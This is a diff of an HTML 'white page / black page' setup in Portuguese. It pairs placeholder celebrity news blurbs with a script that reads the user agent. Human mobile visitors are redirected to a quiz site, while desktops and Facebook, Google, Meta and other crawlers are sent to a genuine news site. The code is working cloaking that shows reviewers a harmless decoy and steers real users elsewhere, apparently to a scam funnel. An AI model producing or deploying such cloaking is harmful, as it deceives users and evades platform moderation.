@@ -13,40 +13,83 @@
             padding: 20px;
             max-width: 800px;
             margin: 0 auto;
-            text-align: center;
         }
         h1 {
             color: #d40000;
             border-bottom: 1px solid #d40000;
             padding-bottom: 10px;
         }
+        .noticia {
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+        #black-page {
+            display: none;
+            background: linear-gradient(135deg, #1e0028 0%, #2a0a3a 100%);
+            color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
     </style>
 </head>
 <body>
-    <!-- PÁGINA WHITE (única página) -->
+    <!-- PÁGINA WHITE COM NOTÍCIAS -->
     <div id="white-page">
         <h1>Últimas Notícias</h1>
-        <p>Carregando conteúdo exclusivo...</p>
+        
+        <div class="noticia">
+            <h2>Anitta anuncia nova turnê internacional</h2>
+            <p>A cantora confirmou shows na Europa para o próximo mês...</p>
+        </div>
+        
+        <div class="noticia">
+            <h2>Whindersson Nunes lança novo especial</h2>
+            <p>O humorista estreia seu novo show na Netflix nesta sexta...</p>
+        </div>
+        
+        <p><small>Fonte: A Televisão</small></p>
     </div>
 
-    <!-- SCRIPT OTIMIZADO -->
+    <!-- PÁGINA BLACK (opcional) -->
+    <div id="black-page">
+        <h1>🔞 Conteúdo Exclusivo</h1>
+        <p>Redirecionando para área VIP...</p>
+    </div>
+
     <script>
+        // Verificação melhorada
         function isHumanMobile() {
+            // Dispositivos móveis reais
             const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
+            // Bots conhecidos
             const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
+            
             return isMobile && !isBot;
         }
 
-        // Redirecionamento direto para mobile (sem black page)
-        if (isHumanMobile()) {
-            setTimeout(() => {
-                window.location.href = "https://avelino-star.github.io/Quiz/";
-            }, 2000); // 2 segundos
-        } else {
-            setTimeout(() => {
-                window.location.href = "https://www.atelevisao.com";
-            }, 3000); // 3 segundos
-        }
+        // Fluxo principal
+        document.addEventListener('DOMContentLoaded', function() {
+            if (isHumanMobile()) {
+                // Celular (humano): White page → 2s → Quiz
+                setTimeout(function() {
+                    window.location.href = "https://avelino-star.github.io/Quiz/";
+                }, 2000);
+            } else {
+                // PC/Bots: White page → 3s → A Televisão
+                setTimeout(function() {
+                    window.location.href = "https://www.atelevisao.com";
+                }, 3000);
+            }
+        });
     </script>
 </body>
 </html>
